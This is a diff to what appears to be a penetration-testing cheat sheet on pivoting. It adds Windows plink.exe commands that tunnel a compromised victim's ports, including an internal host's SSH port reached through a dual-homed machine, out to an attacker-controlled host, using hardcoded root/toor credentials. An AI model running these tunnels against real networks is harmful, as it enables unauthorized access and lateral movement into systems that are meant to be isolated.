@@ -146,21 +146,34 @@ ssh -NfD 1080 [victim user]@[victim ip]
 
 ## Plink
 
-### Plink Port Forwarding
+#### Remote Tunnel
 
-Expose a local port (Special for Windows clients).
-
-Start a ssh server from attackers machine:
 ```
-systemctl start ssh
+cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
 ```
 
-Use plink from Windows machine (Victim):
+for example, suppose you have gained access at a dual-homed host and using this access, you want to access a port at another host that is not connected to the internet (you can't directly talk to it) but is accessible from the host you have access to:
+
+- `attacker_ip` = 13.13.13.13
+- `attacker_port` = 2222 (this is the final port that will accept the remote connection)
+- `victim_ip` = 10.10.10.10 (IP of the inaccessible host)
+- `victim_port` = 22 (Port of the inaccessible host that you will tunnel outside)
+
+`cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 13.13.13.13:2222:10.10.10.10:22 13.13.13.13`
+
+#### Local Tunnel
+
+If you don't want to do an SSH remote port forwarding, but a local one instead:
+
 ```
-cmd.exe /c echo y | plink.exe -ssh -l [attacker_user] -pw [attacker_pass] -R your_ssh_server_ip]:[your_port]:127.0.0.1:[victim_port_you_want_to_forward] [your_ssh_server_ip]
+cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:127.0.0.1:[victim_port] [attacker_ip]
 ```
 
-For this to work, you need the following configuration at your SSH server:
+The above command will forward the local `victim_port` at the host that you have access to, to your `attacker_ip`:`attacker_port`
+
+In the commands above, the `cmd.exe /c echo y |` part can be ommited if you have previously accepted the server SSH certificate.
+
+For the above to work, you need the following configuration at your SSH server:
 `GatewayPorts yes`
 
 ### Plink Troubleshooting
